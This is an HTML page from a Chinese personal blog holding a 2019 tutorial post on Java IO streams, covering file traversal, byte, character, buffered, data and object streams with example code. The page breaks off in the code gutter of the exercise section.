<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="找回当年那个被寄予厚望的自己">
<meta property="og:type" content="website">
<meta property="og:title" content="P0rZ9&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="P0rZ9&#39;s blog">
<meta property="og:description" content="找回当年那个被寄予厚望的自己">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="P0rZ9&#39;s blog">
<meta name="twitter:description" content="找回当年那个被寄予厚望的自己">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>P0rZ9's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">P0rZ9's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/04/Java_IO流/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/04/Java_IO流/" itemprop="url">Java认识 IO流</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-04T08:15:41+08:00">
                2019-04-04
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="文件对象"><a href="#文件对象" class="headerlink" title="文件对象"></a>文件对象</h2><blockquote>
<p>操作练习题1  遍历C:\java目录，列出所有文件 找出最大最小文件(不为0) 打印文件名(要求遍历子文件夹)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">class Result1&#123;</span><br><span class="line">    public File Max_file = null;</span><br><span class="line">    public File Min_file = null;</span><br><span class="line">    public long max_len = 0;</span><br><span class="line">    public long min_len = Integer.MAX_VALUE;</span><br><span class="line"></span><br><span class="line">    public File test1(File f)&#123;</span><br><span class="line">        if (f.isFile())&#123;</span><br><span class="line">            if (f.length() &gt; this.max_len)&#123;</span><br><span class="line">                this.max_len = f.length();</span><br><span class="line">                this.Max_file = f;</span><br><span class="line">            &#125;if (f.length() != 0 &amp;&amp; f.length() &lt; this.min_len)&#123;</span><br><span class="line">                this.min_len = f.length();</span><br><span class="line">                this.Min_file = f;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else if (f.isDirectory())&#123;</span><br><span class="line">            File[] files3 = f.listFiles();</span><br><span class="line">            if (files3 != null)&#123;</span><br><span class="line">                for (File file3 : files3)&#123;</span><br><span class="line">                    test1(file3);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return Max_file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TestFile1&#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        String path = &quot;C:\\java&quot;;</span><br><span class="line">        File f7 = new File(path);</span><br><span class="line">        long start = System.currentTimeMillis();</span><br><span class="line">        Result1 re = new Result1();</span><br><span class="line">        re.test1(f7);</span><br><span class="line">        long end = System.currentTimeMillis();</span><br><span class="line">        System.out.printf(&quot;%s目录下:%n&quot;,path);</span><br><span class="line">        System.out.println(&quot;最大的文件是：&quot;+re.Max_file.getAbsolutePath());</span><br><span class="line">        System.out.println(&quot;大小为:&quot;+re.Max_file.length());</span><br><span class="line">        System.out.println(&quot;最小的文件是&quot;+re.Min_file.getAbsolutePath());</span><br><span class="line">        System.out.println(&quot;大小为:&quot;+re.Min_file.length());</span><br><span class="line">        System.out.println(&quot;用时:&quot;+(end-start)+&quot;毫秒&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">输出:			</span><br><span class="line">C:\java目录下:</span><br><span class="line">最大的文件是：C:\java\jdk1.8.0_144\jre\lib\rt.jar</span><br><span class="line">大小为:63467130</span><br><span class="line">最小的文件是C:\java\demo\test1.txt</span><br><span class="line">大小为:2</span><br><span class="line">用时:1509毫秒</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Windwos下可以用/与\  但是Linux下只能用/(linux不能识别)</p>
</blockquote>
<hr>
<h2 id="流的概念"><a href="#流的概念" class="headerlink" title="流的概念"></a>流的概念</h2><blockquote>
<p>在Java中，文件的输入输出是通过流(Stream)实现的，流按照处理数据的单位分为字节流与字符流。字节流的处理单位是字节，通常用来处理二进制文件，例如图片，音乐，视屏等，而字符的处理单位是字符，通常用来处理文本数据，因为Java采用的是Unicode编码，所以在处理汉字与国际化的文字时，字符流更有优势。</p>
</blockquote>
<p>常用的流类:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-04-04.16.47.31-image.png" alt="2019-04-04.16.47.31-image.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">|- 字节流</span><br><span class="line">        |- 字节输入流 InputStream 抽象类</span><br><span class="line">                    |- FileInputStream 操作文件的字节输入流</span><br><span class="line">        |- 字节输出流 OuputStream抽象类</span><br><span class="line">                    |- FileOutputStream 操作文件的字节输出流</span><br><span class="line">|- 字符流</span><br><span class="line">        |- 字符输入流 Reader抽象类</span><br><span class="line">                    |- InputStreamReader 输入操作的转换流</span><br><span class="line">                                |- FileReader 用来操作文件的字符输入流（简便的流）</span><br><span class="line">        |- 字符输出流 Writer抽象类</span><br><span class="line">                    |- OutputStreamWriter 输出操作的转换流</span><br><span class="line">                                |- FileWriter 用来操作文件的字符输出流（简便的流）</span><br></pre></td></tr></table></figure>
<h2 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h2><blockquote>
<p>所有的字节流都继承自InputStream与OutputStream这两个抽象类(只提供了方法声明，没有具体实现)        </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//基于文件的输入流</span><br><span class="line">File f1 = new File(&quot;c:/java/1.txt&quot;);</span><br><span class="line">FileInputStream fis = new FileInputStream(f1);</span><br><span class="line">byte[] all = new byte[(int)f1.length()];</span><br><span class="line">fis.read(all);</span><br><span class="line">for (byte a : all)&#123;</span><br><span class="line">    System.out.printf(String.valueOf(a));</span><br><span class="line">&#125;</span><br><span class="line">fis.close();</span><br><span class="line"></span><br><span class="line">//基于文件的输出流</span><br><span class="line">输出到文件  文件不存在会自动创建 目录不存在报错(FileNotFoundException)</span><br><span class="line">File f1 = new File(&quot;C:/Java/demo/test1.txt&quot;);</span><br><span class="line">FileOutputStream fileOutputStream = new FileOutputStream(f1);</span><br><span class="line">byte[] data = &#123;49,50,51&#125;;</span><br><span class="line">fileOutputStream.write(data);</span><br><span class="line">fileOutputStream.close();</span><br></pre></td></tr></table></figure>
<h2 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h2><blockquote>
<p>所有的字符流都继承自Reader(读取)与Writer(写入)这两个抽象类。    </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//字符流方式读取文件</span><br><span class="line">File f1 = new File(&quot;c:/java/demo/test.txt&quot;);</span><br><span class="line">try (FileReader fr = new FileReader(f1)) &#123;</span><br><span class="line">    char[] chars = new char[(int) f1.length()];</span><br><span class="line">    fr.read(chars);</span><br><span class="line">    for (char c : chars)&#123;</span><br><span class="line">        System.out.println(c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//字符流方式写入文件</span><br><span class="line">File f1 = new File(&quot;c:/java/demo/test.txt&quot;);</span><br><span class="line">try (FileWriter fw = new FileWriter(f1,true))&#123;</span><br><span class="line">    String data = &quot;abcdefg&quot;;</span><br><span class="line">    char[] chars = data.toCharArray();</span><br><span class="line">    fw.write(chars);</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="字节流与字符流之间的转换"><a href="#字节流与字符流之间的转换" class="headerlink" title="字节流与字符流之间的转换"></a>字节流与字符流之间的转换</h2><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-04-04.17.20.52-image.png" alt="2019-04-04.17.20.52-image.png"></p>
<blockquote>
<p>InputStreamReader是字节流通向字符流的桥梁，如不指定编码，将使用系统默认编码<br>OutputStreamWriter用于将写入的字符编码成字节后写入一个字节流                </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">字节流向字符流转化：</span><br><span class="line">File file = new File(&quot;c:/java/demo/1.txt&quot;);</span><br><span class="line">InputStream fis = new FileInputStream(file);	//字节流</span><br><span class="line">InputStreamReader isr = new InputStreamReader(fis,&quot;utf-8&quot;);</span><br><span class="line">BufferedReader br = new BufferedReader(isr);   //字符缓冲流</span><br><span class="line"></span><br><span class="line">字符流向字节流转化：</span><br><span class="line">File file = new File(&quot;c:/java/demo/1.txt&quot;);</span><br><span class="line">OutputStream os = new FileOutputStream(file);</span><br><span class="line">OutputStreamWriter osw = new OutputStreamWriter(os,&quot;utf-8&quot;);</span><br><span class="line">BufferedWriter bww = new BufferedWriter(osw);</span><br></pre></td></tr></table></figure>
<h2 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h2><blockquote>
<p>前面介绍的字节流与字符流都没有使用缓冲区(字符流的改变编码方式不是实质的缓冲流)。在每一次读写操作都会交给操作系统去处理。这样对性能造成很大的影响。因此对于字节流与字符流，一般都不直接使用 而是与缓冲流一起使用。<br>缓冲流相当于一种装饰器类，目的是让字节流与字符流增加缓存的功能，以字符缓冲流为例，字符缓冲流从字符流当中进行读取与写入，不会立刻要求操作系统去处理，而是先放入一个缓冲区，待缓冲区到达一定的量后就会把这些数据交给操作系统处理，从而减少IO操作，提高性能。        </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">字节缓冲流:			</span><br><span class="line">BufferedInputStream in = new BufferedInputStream(new FileInputStream(&quot;c:/java/demo/1.txt&quot;));</span><br><span class="line">BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(&quot;c:/java/demo/2.txt&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">字符缓冲流:</span><br><span class="line">BufferedReader br = new BufferedReader(new FileReader(f1));</span><br><span class="line">BufferedWriter bw = new BufferedWriter(new FileWriter(f1));</span><br></pre></td></tr></table></figure>
<p>使用字符缓冲流操作数据:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">//通过缓冲流按行读取文件</span><br><span class="line">File f1 = new File(&quot;c:/java/demo/in.txt&quot;);</span><br><span class="line">try (FileReader fr = new FileReader(f1);    //缓冲流必须建立在一个存在的流的基础上</span><br><span class="line">     BufferedReader br = new BufferedReader(fr);) &#123;</span><br><span class="line">    while (true)&#123;</span><br><span class="line">        String line = br.readLine();</span><br><span class="line">        if (null == line)</span><br><span class="line">            break;</span><br><span class="line">        System.out.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//通过缓冲流按行存储文件</span><br><span class="line">File f1 = new File(&quot;c:/java/demo/in.txt&quot;);</span><br><span class="line">try (FileWriter fw = new FileWriter(f1,true);</span><br><span class="line">     PrintWriter pw = new PrintWriter(fw);)&#123;</span><br><span class="line"></span><br><span class="line">    pw.println(&quot;11111111111&quot;);</span><br><span class="line">    pw.println(&quot;22222222222&quot;);//等缓冲区达到一定数量，才把这些数据一起写入硬盘</span><br><span class="line">    pw.println(&quot;33333333333&quot;);</span><br><span class="line">    pw.flush();                 //立即将数据写入硬盘</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h2><blockquote>
<p>使用数据流的writeUTF()和readUTF() 可以进行数据的格式化顺序读写，方便流对数据的读取与写入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">//数据的格式化顺序读写   数据流DataInputStream的方式</span><br><span class="line">//通过DataOutputStream依次写入数据 通过DataInputStream按照顺序依次读出数据</span><br><span class="line">public static void main(String[] args)&#123;</span><br><span class="line">    write();</span><br><span class="line">    read();</span><br><span class="line">&#125;</span><br><span class="line">static void read()&#123;</span><br><span class="line">    File f1 = new File(&quot;c:/java/demo/1.txt&quot;);</span><br><span class="line">    try ( FileInputStream fis = new FileInputStream(f1);</span><br><span class="line">          DataInputStream dis = new DataInputStream(fis);)&#123;</span><br><span class="line">        boolean b = dis.readBoolean();</span><br><span class="line">        int i = dis.readInt();</span><br><span class="line">        int j = dis.readInt();</span><br><span class="line">        String s = dis.readUTF();</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;boolean:&quot;+b);</span><br><span class="line">        System.out.println(&quot;int_i:&quot;+i);</span><br><span class="line">        System.out.println(&quot;int_j:&quot;+j);</span><br><span class="line">        System.out.println(&quot;string:&quot;+s);</span><br><span class="line"></span><br><span class="line">    &#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">static void write()&#123;</span><br><span class="line">    File f1 = new File(&quot;c:/java/demo/1.txt&quot;);</span><br><span class="line">    try(  FileOutputStream fos = new FileOutputStream(f1);</span><br><span class="line">          DataOutputStream dos = new DataOutputStream(fos);)&#123;</span><br><span class="line">            dos.writeBoolean(true);</span><br><span class="line">            dos.writeInt(10);</span><br><span class="line">            dos.writeInt(20);</span><br><span class="line">            dos.writeUTF(&quot;This is String&quot;);</span><br><span class="line">    &#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h2 id="对象流"><a href="#对象流" class="headerlink" title="对象流"></a>对象流</h2><blockquote>
<p>对象流也属于包装类，包装后使得原来的对象具有对对象进行读写的功能，当对象具有很多属性时，用对象流可以简化代码。对象流在读写对象时，必须对对象进行序列化，也就是说该对象必须实现Serializable接口，这是为了将对象写成特殊序列的字节码文件，在读文件的时候可以还原这个对象。            </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Hero h = new Hero(&quot;P0rZ9&quot;);</span><br><span class="line">h.id = 1;</span><br><span class="line"></span><br><span class="line">File file = new File(&quot;c:/java/demo/1.bin&quot;);</span><br><span class="line">try (   //输出流</span><br><span class="line">        FileOutputStream fos = new FileOutputStream(file);</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(fos);</span><br><span class="line"></span><br><span class="line">        //输入流</span><br><span class="line">        FileInputStream fis = new FileInputStream(file);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(fis);)&#123;</span><br><span class="line">    oos.writeObject(h);</span><br><span class="line">    Hero h1 = (Hero) ois.readObject();</span><br><span class="line">    System.out.println(h1.id);</span><br><span class="line">    System.out.println(h1.name);</span><br><span class="line"></span><br><span class="line">&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; catch (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span 